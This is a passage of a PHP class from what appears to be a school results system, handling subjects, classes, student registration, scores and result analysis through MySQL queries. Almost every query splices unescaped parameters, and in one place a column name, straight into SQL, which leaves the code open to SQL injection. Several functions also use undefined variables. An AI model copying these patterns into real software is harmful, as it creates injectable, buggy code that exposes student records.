      $query=mysqli_query(dbass::Connect(),"SELECT * from subjects   order by subject ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['subject'], $news)){
          array_push($news, $res['subject']);
        }
      }
      
      return $news;
  }

  public static function ReadAllSubjectAllocations(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from subject_allocation   order by class ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['id'], $news)){
          array_push($news, $res['id']);
        }
      }
      
      return $news;
  }

  public static function ReadClassAllocationsp(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from pclass_allocation   order by class ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['id'], $news)){
          array_push($news, $res['id']);
        }
      }
      
      return $news;
  }

  public static function DeleteAllocation($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from subject_allocation where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function DeleteSubjectAllocation($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from subject_allocation where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function AddClassp($class,$yc,$level){
      $query=mysqli_query(dbass::Connect(),"INSERT into classes(`class`,`yc`,`level`) values('$class','$yc','$level')");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function DeleteClassp($class){
      $query=mysqli_query(dbass::Connect(),"DELETE from classes where class='$class'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function DeleteIdClassp($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from classes where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function DeleteAllocationp($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from pclass_allocation where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }


  public static function ReadAllocationDetails($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from subject_allocation where id='$id' ");
      
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['subject']=$res['subject'];
        $news['staffid']=$res['staff_id'];
        $news['class']=$res['class'];
        $news['session']=$res['session'];
        $news['term']=$res['term'];
        $news['level']=$res['level'];

      }
      
      return $news;
  }


  public static function ReadAllocationDetailsp($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from pclass_allocation where id='$id' ");
      
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['staffid']=$res['staff_id'];
        $news['class']=$res['class'];
        $news['session']=$res['session'];
        $news['term']=$res['term'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }


  public static function ReadAllSubjectsp(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psubjects   order by subject ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['subject'], $news)){
          array_push($news, $res['subject']);
        }
      }
      
      return $news;
  }

  public static function ReadSubjectLibraryp(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from subject_library   order by subject ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['id'], $news)){
          array_push($news, $res['id']);
        }
      }
      
      return $news;
  }

  public static function ReadSubjectLibraryDetailsp($subject){
      $query=mysqli_query(dbass::Connect(),"SELECT * from subject_library where subject='$subject'  ");
      
      while($res=mysqli_fetch_array($query))
      {
          $news['subject']= $res['subject'];
          $news['short_code']= $res['sub_code'];
          $news['id']= $res['id'];
          $news['timestamp']= $res['timestamp'];
      }
      
      return $news;
  }

  public static function ReadClassLibraryDetailsp($class){
      $query=mysqli_query(dbass::Connect(),"SELECT * from classes where class='$class'  ");
      
      while($res=mysqli_fetch_array($query))
      {
          $news['class']= $res['class'];
          $news['yc']= $res['yc'];
          $news['id']= $res['id'];
          $news['level']= $res['level'];
          $news['timestamp']= $res['timestamp'];
      }
      
      return $news;
  }

  public static function ReadClassLibraryIdDetailsp($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from classes where id='$id'  ");
      
      while($res=mysqli_fetch_array($query))
      {
          $news['class']= $res['class'];
          $news['yc']= $res['yc'];
          $news['id']= $res['id'];
          $news['level']= $res['level'];
          $news['timestamp']= $res['timestamp'];
      }
      
      return $news;
  }

  public static function ReadSubjectLibraryIdDetailsp($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from subject_library where id='$id'  ");
      
      while($res=mysqli_fetch_array($query))
      {
          $news['subject']= $res['subject'];
          $news['short_code']= $res['sub_code'];
          $news['id']= $res['id'];
          $news['timestamp']= $res['timestamp'];
      }
      
      return $news;
  }


  public static function ReadAllSubjectsIdp(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psubjects   order by subject ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['id'], $news)){
          array_push($news, $res['id']);
        }
      }
      
      return $news;
  }

  public static function ReadClasses(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from classes  ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['class'], $news)){
          array_push($news, $res['class']);
        }
      }
      sort($news);
      
      return $news;
  }

  public static function ReadIdClasses(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from classes  ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['id'], $news)){
          array_push($news, $res['id']);
        }
      }
      sort($news);
      
      return $news;
  }

  public static function ReadYCClass($yc){
      $query=mysqli_query(dbass::Connect(),"SELECT * from classes where yc='$yc'  ");
      while($res=mysqli_fetch_array($query))
      {
        $class=$res['class'];
      }
      
      return $class;
  }

  public static function DeleteSubject($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from subjects where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function DeleteSubjectp($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from subject_library where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function ReadSubjectDetails($subject){
      $query=mysqli_query(dbass::Connect(),"SELECT * from subjects where subject='$subject'  ");
      
      while($res=mysqli_fetch_array($query))
      {
          $news['subject']= $res['subject'];
          $news['level']= $res['level'];
          $news['id']= $res['id'];
          $news['short_code']= $res['short_code'];
      }
      
      return $news;
  }

  public static function ReadSubjectDetailsp($subject){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psubjects where subject='$subject'  ");
      
      while($res=mysqli_fetch_array($query))
      {
          $news['subject']= $res['subject'];
          $news['level']= $res['level'];
          $news['class']= $res['class'];
          $news['id']= $res['id'];
          $news['short_code']= $res['short_code'];
      }
      
      return $news;
  }

  public static function ReadSubjectIdDetailsp($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psubjects where id='$id'  ");
      
      while($res=mysqli_fetch_array($query))
      {
          $news['subject']= $res['subject'];
          $news['level']= $res['level'];
          $news['class']= $res['class'];
          $news['id']= $res['id'];
          $news['short_code']= $res['short_code'];
      }
      
      return $news;
  }


  //Result Modules Starts
  public static function GetClassLevel($class){
    $sub=substr($class, 0,1);
    if($sub=="J")
    {
      $news="Junior";
    }
    elseif($sub=="S")
    {
      $news="Senior";
    }
    return $news;
  }

  public static function GetClassLevelp($class){
    $sub=substr($class, 0,3);
    if($sub=="Pri")
    {
      $news="Primary";
    }
    elseif($sub=="Pre")
    {
      $news="Nursery";
    }
    elseif($sub=="Nur")
    {
      $news="Nursery";
    }
    
    return $news;
  }

  public static function GetClassSession($class){
    $session=Module::ReadCurrentSession();

    $currentsession=$session['session'];
    if(substr($class, 0,1)=="J")
    {
      $class=substr($class, 0,5);
    }
    elseif(substr($class, 0,1)=="S")
    {
      $class=substr($class, 0,4);
    }


    $currentsessionTokens=explode("/", $currentsession);
    $first=$currentsessionTokens[0];
    $second=$currentsessionTokens[1];
    if($class=="JSS 1"||$class=="Jss 1"||$class=="jss 1")
    {
      $news=$currentsession;
    }
    elseif($class=="JSS 2"||$class=="Jss 2"||$class=="jss 2")
    {
      $news=($first-1)."/".($second-1);
    }
    elseif($class=="JSS 3"||$class=="Jss 3"||$class=="jss 3")
    {
      $news=($first-2)."/".($second-2);
    }
    elseif($class=="SS 1"||$class=="Ss 1"||$class=="ss 1")
    {
      $news=($first-3)."/".($second-3);
    }
    elseif($class=="SS 2"||$class=="Ss 2"||$class=="ss 2")
    {
      $news=($first-4)."/".($second-4);
    }
    elseif($class=="SS 3"||$class=="Ss 3"||$class=="ss 3")
    {
      $news=($first-5)."/".($second-5);
    }
    
    return $news;
  }


  public static function GetClassSessionp($class){
    if(Module::IsClassExistp($class))
    {
      $session=Module::ReadCurrentSession();
      $classDetails=Module::ReadClassLibraryDetailsp($class);
      $yc=$classDetails['yc'];
      $currentsession=$session['session'];

      $currentsessionTokens=explode("/", $currentsession);
      $first=$currentsessionTokens[0];
      $second=$currentsessionTokens[1];
      $news=($first-$yc+1)."/".($second-$yc+1);
    }
    else
    {
      $news="Class Not Found";
    }

    return $news;
  }

  public static function IsStudentInAnalysis($student,$session,$term,$class){
      $query=mysqli_query(dbass::Connect(),"select * from result_analysis where reg_no='$student' and session='$session' and class='$class' and term='$term'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function IsStudentInAnalysisp($student,$session,$term,$class){
    
    $query=mysqli_query(dbass::Connect(),"select * from presult_analysis where reg_no='$student' and session='$session' and term='$term' and `class`='$class'");

    $res=mysqli_num_rows($query);
    if($res>0 and $res==1)
    {
        $rs=True;
    }
    elseif($res>1)
    {
      Module::DeleteAnalysisResultp($student,$session,$term,$class);
      $rs=false;
    }
    
    return $rs;
  }

  public static function IsStudentRegistered($regno,$subject,$session,$term,$class){
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where reg_no='$regno' and session='$session' and term='$term' and class='$class' and subject='$subject'");

    $res=mysqli_num_rows($query);
    if($res>0)
    {
        $rs=True;
    }
    
    return $rs;
  }

  public static function IsResultTypeEntered($subject,$session,$term,$class,$type){
      $query=mysqli_query(dbass::Connect(),"SELECT sum(".$type.") from presult where session='$session' and term='$term' and class='$class' and subject='$subject' ");

      while($res=mysqli_fetch_array($query))
      {
          $news= $res[0];
      }

      if($news>0)
      {
        $resp=true;
      }
      else
      {
        $resp=false;
      }
      
      return $resp;
  }

  public static function IsStudentRegisteredp($regno,$subject,$session,$term,$class){
      $query=mysqli_query(dbass::Connect(),"SELECT * from presult where reg_no='$regno' and session='$session' and term='$term' and subject='$subject' and class='$class'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function IsClassSubjectRegisteredp($subject,$shortcode,$class,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psubjects where subject='$subject' and short_code='$shortcode'  and class='$class' and session='$session' and term='$term'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function IsClassInSubjectsp($class){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psubjects where  class='$class'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function IsClassInAllocationp($class){
      $query=mysqli_query(dbass::Connect(),"SELECT * from pclass_allocation where  class='$class'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function IsClassInResultsp($class){
      $query=mysqli_query(dbass::Connect(),"SELECT * from presult where  class='$class'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function RegisterSubject($regno,$subject,$session,$term,$class){
    $level=Module::GetLevel($class);
    if(!(Module::IsStudentRegistered($regno,$subject,$session,$term,$class)))
      {
        $query=mysqli_query(dbass::Connect(),"INSERT into result(reg_no,subject,session,term,class,level) values('$regno','$subject','$session','$term','$class','$level')");
        if($query){
          $news=true;
        }
        else{
          $news=false;
        }

      } 

      if(!(Module::IsStudentInAnalysis($regno,$session,$term,$class)))
      {
        if(Module::RegisterStudent($regno,$session,$term,$class))
        {
          $news= "$regno Added to Result Analysis";
        }
      }

    return $news;
  }

  public static function RegisterClassSubject($subject,$shortcode,$class,$session,$term){
    $level=Module::GetLevel($class);
    if(!(Module::IsClassSubjectRegisteredp($subject,$shortcode,$class,$session,$term)))
      {
        $query=mysqli_query(dbass::Connect(),"INSERT into psubjects(subject,short_code,class,level,session,term) values('$subject','$shortcode','$class','$level','$session','$term')");
        if($query){
          $news=true;
        }
        else{
          $news=false;
        }

      } 

    return $news;
  }

  public static function CancelClassSubjectRegistration($subject,$shortcode,$class,$session,$term){
    $level=Module::GetLevel($class);
    if(Module::IsClassSubjectRegisteredp($subject,$shortcode,$class,$session,$term))
      {
        $query=mysqli_query(dbass::Connect(),"DELETE from psubjects where subject='$subject' and short_code='$shortcode' and class='$class' and session='$session' and term='$term'");
        if($query){
          $news=true;
        }
        else{
          $news=false;
        }

      } 

    return $news;
  }

  public static function CancelStudentTermResults($reg_no,$session,$term){

    $query=mysqli_query(dbass::Connect(),"DELETE from presult where reg_no='$reg_no' and term='$term' and session='$session' ");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }
    return $news;
  }

  public static function CancelStudentSubjectRegistration($reg_no,$subject,$session,$term,$class){

    $query=mysqli_query(dbass::Connect(),"DELETE from presult where reg_no='$reg_no' and subject='$subject' and session='$session' and term='$term' and class='$class'");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }
    return $news;
  }

  public static function RegisterSubjectp($regno,$subject,$session,$term,$class){
     if(!(Module::IsStudentRegisteredp($regno,$subject,$session,$term,$class)))
      {
        $query=mysqli_query(dbass::Connect(),"INSERT into presult(reg_no,subject,session,term,class) values('$regno','$subject','$session','$term','$class')");
        if($query){
          $news=true;
        }
        else{
          $news=false;
        }

      } 

      if(!(Module::IsStudentInAnalysisp($regno,$session,$term,$class)))
      {
        if(Module::RegisterStudentp($regno,$session,$term,$class))
        {
          $news= "<hr/>$regno Added to Result Analysis<hr/>";
        }
      }

    return $news;
  }
  
  public static function RegisterAllStudent($class,$subject,$session,$term){
    foreach(Module::ReadClassStudents($class) as $regno)
    {
      Module::RegisterSubject($regno,$subject,$session,$term,$class);
    }

    return $news;
  }

  public static function RegisterAllStudentp($class,$subject,$session,$term){
    foreach(Module::ReadClassStudentsp($class) as $regno)
    {
      if(Module::RegisterSubjectp($regno,$subject,$session,$term,$class))
        $news=true;
      else
        $news=false;
    }

    return $news;
  }

  public static function RegisterStudent($regno,$session,$term,$class){
    if(!(Module::IsStudentScoreExist($student,$subject,$session,$term)))
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into result_analysis(reg_no,session,term,class) values('$regno','$session','$term','$class')");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }

    return $news;
  }

  public static function RegisterStudentp($regno,$session,$term,$class){
    
    $query=mysqli_query(dbass::Connect(),"INSERT into presult_analysis(reg_no,session,term,class) values('$regno','$session','$term','$class')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }

  public static function NextTermBegins($session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from session where session='$session' and term='$term' ");
      while($res=mysqli_fetch_array($query))
      {
        $news=$res['next_term_begins'];
      }
      
      return $news;
  }

  public static function GetSubjectCode($subject){
      $query=mysqli_query(dbass::Connect(),"select * from subjects where subject='$subject'");
      while($res=mysqli_fetch_array($query))
      {
        $news=$res['short_code'];
      }
      
      return $news;
  }

  public static function GetSubjectCodep($subject){
      $query=mysqli_query(dbass::Connect(),"select * from psubjects where subject='$subject'");
      while($res=mysqli_fetch_array($query))
      {
        $news=$res['short_code'];
      }
      
      return $news;
  }

  public static function GetTotalScore($student,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT sum(total) from result where reg_no='$student' and session='$session' and term='$term' ");
      while($res=mysqli_fetch_array($query))
      {
        $news=$res[0];
      }
      
      return $news;
  }

  public static function GetTotalScorep($student,$session,$term,$class){
      $query=mysqli_query(dbass::Connect(),"SELECT sum(total) from presult where reg_no='$student' and session='$session' and term='$term' and class='$class' ");
      while($res=mysqli_fetch_array($query))
      {
        $news=$res[0];
      }
      
      return $news;
  }

  public static function GetTotalCa1Scorep($student,$session,$term,$class){
      $query=mysqli_query(dbass::Connect(),"SELECT sum(ca_1) from presult where reg_no='$student' and session='$session' and term='$term' and class='$class' ");
      while($res=mysqli_fetch_array($query))
      {
        $news=$res[0];
      }
      
      return $news;
  }

  public static function GetTotalCa2Scorep($student,$session,$term,$class){
      $query=mysqli_query(dbass::Connect(),"SELECT sum(ca_2) from presult where reg_no='$student' and session='$session' and term='$term' and class='$class' ");
      while($res=mysqli_fetch_array($query))
      {
        $news=$res[0];
      }
      
      return $news;
  }

  public static function GetTotalCa3Scorep($student,$session,$term,$class){
      $query=mysqli_query(dbass::Connect(),"SELECT sum(ca_3) from presult where reg_no='$student' and session='$session' and term='$term' and class='$class' ");
      while($res=mysqli_fetch_array($query))
      {
        $news=$res[0];
      }
      
      return $news;
  }


  public static function GetTotalExamScorep($student,$session,$term,$class){
      $query=mysqli_query(dbass::Connect(),"SELECT sum(exam) from presult where reg_no='$student' and session='$session' and term='$term' and class='$class' ");
      while($res=mysqli_fetch_array($query))
      {
        $news=$res[0];
      }
      
      return $news;
  }

  public static function GetGrandTotalp($student,$session,$term,$class){
      $query=mysqli_query(dbass::Connect(),"SELECT sum(total) from presult where reg_no='$student' and session='$session' and term='$term' and class='$class' ");
      while($res=mysqli_fetch_array($query))
      {
        $news=$res[0];
      }
      
      return $news;
  }

  public static function GetGrandCATotalp($student,$session,$term,$class){
      $query=mysqli_query(dbass::Connect(),"SELECT sum(ca_total) from presult where reg_no='$student' and session='$session' and term='$term' and class='$class' ");
      while($res=mysqli_fetch_array($query))
      {
        $news=$res[0];
      }
      
      return $news;
  }

  public static function GetTotalSubjects($student,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from result where reg_no='$student' and session='$session' and term='$term' ");
      $news=mysqli_num_rows($query);
      
      return $news;
  }

  public static function GetTotalSubjectsp($student,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from presult where reg_no='$student' and session='$session' and term='$term' ");
      $news=mysqli_num_rows($query);
      
      return $news;
  }

  public static function ReadSubjects($level){
      $query=mysqli_query(dbass::Connect(),"SELECT * from subjects where level='$level'  order by subject ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array(Module::GetSubjectCode($res['subject']), $news)){
          array_push($news, Module::GetSubjectCode($res['subject']));
        }
      }
      
      return $news;
  }

  public static function ReadSubjectsp($class){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psubjects where class='$class'  order by subject ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array(Module::GetSubjectCodep($res['subject']), $news)){
          array_push($news, Module::GetSubjectCodep($res['subject']));
        }
      }
      
      return $news;
  }


  public static function ReadLevelSubjectsp($level){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psubjects where level='$level'  order by subject ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array(Module::GetSubjectCodep($res['subject']), $news)){
          array_push($news, Module::GetSubjectCodep($res['subject']));
        }
      }
      
      return $news;
  }


  public static function ReadSubjectResult($student,$subject,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from result where reg_no='$student' and session='$session' and term='$term' and subject='$subject' ");

      while($res=mysqli_fetch_array($query))
      {
         $news['regno']=$res['reg_no'];
         $news['subject']=$res['subject'];
         $news['session']=$res['session'];
         $news['term']=$res['term'];
         $news['ca1']=$res['ca_1'];
         $news['ca2']=$res['ca_2'];
         $news['ca3']=$res['ca_3'];
         $news['exam']=$res['exam'];
         $news['catotal']=$res['ca_total'];
         $news['total']=$res['total'];
         $news['remark']=$res['remark'];
         $news['grade']=$res['grad_e'];
         $news['teacherRemark']=$res['teacher_remark'];
         $news['position']=$res['position'];
      }
      
      return $news;
  }

  public static function GetLowestScorep($subject,$session,$term,$class)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT min(total) from presult where subject='$subject' and session='$session' and term='$term' and class='$class' ");
    if($res=mysqli_fetch_array($query))
    {
      return $res[0];
    }
  }

  public static function GetHighestScorep($subject,$session,$term,$class)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT max(total) from presult where subject='$subject' and session='$session' and term='$term' and class='$class' ");
    if($res=mysqli_fetch_array($query))
    {
      return $res[0];
    }
  }    

  public static function ReadSubjectResultp($student,$subject,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from presult where reg_no='$student' and session='$session' and term='$term' and subject='$subject' ");

      while($res=mysqli_fetch_array($query))
      {
         $news['regno']=$res['reg_no'];
         $news['subject']=$res['subject'];
         $news['session']=$res['session'];
         $news['class']=$res['class'];
         $news['term']=$res['term'];
         $news['ca1']=$res['ca_1'];
         $news['ca2']=$res['ca_2'];
         $news['ca3']=$res['ca_3'];
         $news['exam']=$res['exam'];
         $news['catotal']=round($res['ca_total'],2);
         $news['total']=$res['total'];
         $news['lowest_score']=Module::GetLowestScorep($subject,$session,$term,$news['class']);
         $news['highest_score']=Module::GetHighestScorep($subject,$session,$term,$news['class']);
         $news['remark']=$res['remark'];
         $news['grade']=$res['grad_e'];
         $news['teacherRemark']=$res['teacher_remark'];
         $news['position']=$res['position'];
         $news['comment']=$res['comment'];
      }
      
      return $news;
  }



  public static function Sync_ReadSubjectResultp($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from sync_presult where id='$id'");

      while($res=mysqli_fetch_array($query))
      {
         $news['regno']=$res['reg_no'];
         $news['subject']=$res['subject'];
         $news['session']=$res['session'];
         $news['class']=$res['class'];
         $news['term']=$res['term'];
         $news['ca1']=$res['ca_1'];
         $news['ca2']=$res['ca_2'];
         $news['ca3']=$res['ca_3'];
         $news['exam']=$res['exam'];
         $news['catotal']=round($res['ca_total'],2);
         $news['total']=$res['total'];
         $news['lowest_score']=Module::GetLowestScorep($subject,$session,$term,$news['class']);
         $news['highest_score']=Module::GetHighestScorep($subject,$session,$term,$news['class']);
         $news['remark']=$res['remark'];
         $news['grade']=$res['grad_e'];
         $news['teacherRemark']=$res['teacher_remark'];
         $news['position']=$res['position'];
         $news['comment']=$res['comment'];
      }
      
      return $news;
  }

  public static function CountSessionSubjectTermsResultp($student,$subject,$session){
      $query=mysqli_query(dbass::Connect(),"SELECT count(total) from presult where reg_no='$student' and session='$session' and subject='$subject' ");

      while($res=mysqli_fetch_array($query))
      {
         $news['regno']=$res[0];
      }
      
      return $news;
  }

  public static function CountStudentsp($status,$session,$class){
    $ree=explode("/", $session);
    $year=$ree[0];
    $classtoken=substr($class, strlen($class)-1);
    

    if(!(($classtoken=="A") || ($classtoken=="B") || ($classtoken=="C") || ($classtoken=="D") || ($classtoken=="E") || ($classtoken=="F") || ($classtoken=="G") || ($classtoken=="H") || ($classtoken=="I") || ($classtoken=="J") || ($classtoken=="K") || ($classtoken=="L") || ($classtoken=="M") || ($classtoken=="N") || ($classtoken=="O") || ($classtoken=="P") || ($classtoken=="Q") || ($classtoken=="R") || ($classtoken=="S") || ($classtoken=="T") || ($classtoken=="U") || ($classtoken=="V") || ($classtoken=="W") || ($classtoken=="X") || ($classtoken=="Y") || ($classtoken=="Z")))
    {
      $regno=$school_details['school_keycode']."/$year"."/$regn";
    }
    else
    {
      $regno=$school_details['school_keycode']."/$year/".$classtoken."/$regn";
    }

      $query=mysqli_query(dbass::Connect(),"SELECT count($status) from pstudents where  session='$session'  and reg_no like '%$regno%' order by reg_id asc ");

      while($res=mysqli_fetch_array($query))
      {
         $news=$res[0];
      }
      
      return $news;
  }

  public static function GetSessionSubjectResultp($student,$subject,$session){
      $query=mysqli_query(dbass::Connect(),"SELECT sum(total) from presult where reg_no='$student' and session='$session' and subject='$subject' ");

      while($res=mysqli_fetch_array($query))
      {
         $news['regno']=$res[0];
      }
      
      return $news;
  }

  public static function CountSessionSubjectResultp($student,$session){
      $query=mysqli_query(dbass::Connect(),"SELECT count(reg_no) from presult where reg_no='$student' and session='$session'");

      while($res=mysqli_fetch_array($query))
      {
         $news['total']=$res[0];
      }
      
      return $news['total'];
  }

  public static function ReadSessionTermsp($student,$session){
      $query=mysqli_query(dbass::Connect(),"SELECT * from presult where reg_no='$student' and session='$session' ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['term'], $news)){
          array_push($news, $res['term']);
        }
      }
      
      return $news;
  }

  public static function GetSessionTotalScorep($student,$session){
      $query=mysqli_query(dbass::Connect(),"SELECT sum(total) from presult where reg_no='$student' and session='$session'");

      while($res=mysqli_fetch_array($query))
      {
         $news['total']=$res[0];
      }
      
      return $news['total'];
  }

  public static function ReadStudentSessionTermsp($student,$session){
    $query=mysqli_query(dbass::Connect(),"SELECT term from presult where session='$session' and reg_no='$student' order by term");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!in_array($res['term'],$news))
      {
        array_push($news, $res['term']);
      }      
    }
    
    return $news;
  }

  public static function IdentifyStudent($student_name)
  {
    $student_name=strtolower($student_name);
    $query=mysqli_query(dbass::Connect(),"SELECT * from pstudents where names='$student_name' ");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      $news['reg_no']=$res['reg_no'];
      $news['names']=$res['names'];
      $news['class']=$res['class'];      
    }
    
    return $news;
  }

  public static function ExtractSessionSubjectResultAnalysisp($student,$subject,$session,$class){

    $totalRegisteredSubject=Module::CountSessionSubjectResultp($student,$session);

    $totalClassSubjects=Module::CountSubjectsp($class);

    $termCount=count(Module::ReadSessionTermsp($student,$session));



    $news['ca1_total']=Module::GetSessionStudentCa1Scorep($student,$subject,$session);
    $news['ca1_average']=$news['ca1_total']/$termCount;

    $GradeGetails=Grades::ReadScoreDetails($ca1_average);
    $news['ca1_grade']=$GradeGetails['grade_symbol'];
    $news['ca1_remark']=$GradeGetails['grade_remark_anal'];

    

    $news['ca2_total']=Module::GetSessionStudentCa2Scorep($student,$subject,$session);
    $news['ca2_average']=$news['ca2_total']/$termCount;

    $GradeGetails=Grades::ReadScoreDetails($ca2_average);
    $news['ca2_grade']=$GradeGetails['grade_symbol'];
    $news['ca2_remark']=$GradeGetails['grade_remark_anal'];

    

    $news['ca3_total']=Module::GetSessionStudentCa3Scorep($student,$subject,$session);
    $news['ca3_average']=$news['ca3_total']/$termCount;

    $GradeGetails=Grades::ReadScoreDetails($ca3_average);
    $news['ca3_grade']=$GradeGetails['grade_symbol'];
    $news['ca3_remark']=$GradeGetails['grade_remark_anal'];

    

    $news['exam_total']=Module::GetSessionStudentExamScorep($student,$subject,$session);
    $news['exam_average']=$news['exam_total']/$termCount;

    $GradeGetails=Grades::ReadScoreDetails($exam_average);
    $news['exam_grade']=$GradeGetails['grade_symbol'];
    $news['exam_remark']=$GradeGetails['grade_remark_anal'];

    

    $news['total_total']=Module::GetSessionStudentTotalScorep($student,$subject,$session);
    $news['total_average']=$news['total_total']/$termCount;

    $GradeGetails=Grades::ReadScoreDetails($average);
    $news['total_grade']=$GradeGetails['grade_symbol'];
    $news['total_remark']=$GradeGetails['grade_remark_anal'];


    return $news;
  }

  public static function ReadRegisteredSubjectsp($class){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psubjects where class='$class' order by short_code  ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['short_code'], $news))
          array_push($news, $res['short_code']);
      }
      return $news;
  }

  public static function ReadResultAnalysis($student,$session,$term,$class){
      $query=mysqli_query(dbass::Connect(),"SELECT * from result_analysis where reg_no='$student' and session='$session' and term='$term' and class='$class' ");
      
      while($res=mysqli_fetch_array($query))
      {
          $news['position']= $res['position'];
          $news['appearance']= $res['appearance'];
          $news['attendance']= $res['attendance'];
          $news['conduct']= $res['conduct'];
          $news['principalRemark']= $res['principal_remark'];
          $news['formMasterRemark']= $res['form_master_remark'];
          $news['TotalScore']= $res['total'];
      }
      
      return $news;
  }

  public static function ReadResultAnalysisp($student,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where reg_no='$student' and session='$session' and term='$term' ");
      
      while($res=mysqli_fetch_array($query))
      {
          $news['position']= $res['position'];
          $news['total']= $res['total'];
          $news['average']= $res['average'];
          $news['appearance']= $res['appearance'];
          $news['attendance']= $res['attendance'];
          $news['conduct']= $res['conduct'];
          $news['principalRemark']= $res['principal_remark'];
          $news['grade']= $res['grade'];
          $news['remark']= $res['principal_remark'];
          $news['formMasterRemark']= $res['form_master_remark'];
          $news['total']= $res['total'];
          $news['TotalScore']= $res['total'];
          $news['ca1_total']= $res['ca1_total'];
          $news['ca1_remark']= $res['ca1_remark'];
          $news['ca1_position']= $res['ca1_position'];
          $news['ca2_total']= $res['ca2_total'];
          $news['ca2_remark']= $res['ca2_remark'];
          $news['ca2_position']= $res['ca2_position'];
          $news['ca3_total']= $res['ca3_total'];
          $news['ca3_remark']= $res['ca3_remark'];
          $news['ca3_position']= $res['ca3_position'];
          $news['exam_total']= $res['exam_total'];
          $news['exam_remark']= $res['exam_remark'];
          $news['exam_position']= $res['exam_position'];
          $news['totalstudentsubject']= $res['totalstudentsubject'];
      }
      
      return $news;
  }

  public static function ReadResultDetails($student,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from result_analysis where reg_no='$student' and session='$session' and term='$term' ");
      
      while($res=mysqli_fetch_array($query))
      {
          $news['position']= $res['position'];
          $news['appearance']= $res['appearance'];
          $news['attendance']= $res['attendance'];
          $news['conduct']= $res['conduct'];
          $news['principalRemark']= $res['principal_remark'];
          $news['formMasterRemark']= $res['form_master_remark'];
          $news['TotalScore']= $res['total'];
      }
      
      return $news;
  }

